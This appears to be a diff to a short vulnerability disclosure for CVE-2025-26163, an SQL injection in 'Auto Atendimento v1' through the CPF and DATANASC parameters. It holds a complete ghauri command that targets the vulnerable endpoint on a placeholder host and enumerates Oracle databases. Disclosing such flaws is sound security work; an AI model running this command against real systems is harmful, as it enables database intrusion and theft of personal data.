@@ -1,3 +1,4 @@
+CVE-2025-26163
 SQL Injection vulnerability in Auto Atendimento v1  allows a remote attacker to execute arbitrary code via the CPF and DATANASC parameters.
 
 ghauri -u "https://www.teste.com.br/autoatendimento/AutoAtendimento.exe/NovoUsuario" --data "CPF=12345678912&Dia=02&Mes=02&Ano=1998&DATANASC=02%2F02%2F1998&DATAADMISSAO=18%2F02%2F2002&SITUACAO=A" --dbs --random-agent -p CPF,DATANASC --dbms Oracle
